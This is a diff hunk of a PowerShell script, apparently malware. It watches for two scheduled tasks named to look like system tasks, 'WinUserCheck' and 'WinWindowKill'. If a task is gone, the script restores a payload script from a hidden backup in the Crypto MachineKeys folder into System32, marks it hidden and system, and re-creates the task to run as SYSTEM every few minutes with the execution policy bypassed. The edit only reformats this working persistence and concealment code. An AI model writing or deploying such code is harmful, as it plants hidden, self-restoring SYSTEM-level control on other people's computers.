@@ -34,20 +34,20 @@ $task2 = schtasks /Query /TN "WinWindowKill" 2>&1
 $backupPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"
 $restoreDir = "$env:windir\System32\Com\en-US"
 
-if ($task1 -match "ERROR: The system cannot find the file specified") {
+if ($task1 -like "*ERROR: The system cannot find the file specified*") {
     if (-not (Test-Path "$restoreDir\sys_usr.ps1")) {
         Copy-Item "$backupPath\win_ux.ps1" "$restoreDir\sys_usr.ps1" -Force
         attrib +h +s "$restoreDir\sys_usr.ps1"
     }
-    schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_usr.ps1`"" /RU SYSTEM
-
+    schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F `
+        /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_usr.ps1`"" /RU SYSTEM
 }
 
-if ($task2 -match "ERROR: The system cannot find the file specified") {
+if ($task2 -like "*ERROR: The system cannot find the file specified*") {
     if (-not (Test-Path "$restoreDir\sys_win.ps1")) {
         Copy-Item "$backupPath\win_ui.ps1" "$restoreDir\sys_win.ps1" -Force
         attrib +h +s "$restoreDir\sys_win.ps1"
     }
-    schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 13 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_win.ps1`"" /RU SYSTEM
-
+    schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 13 /RL HIGHEST /F `
+        /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_win.ps1`"" /RU SYSTEM
 }
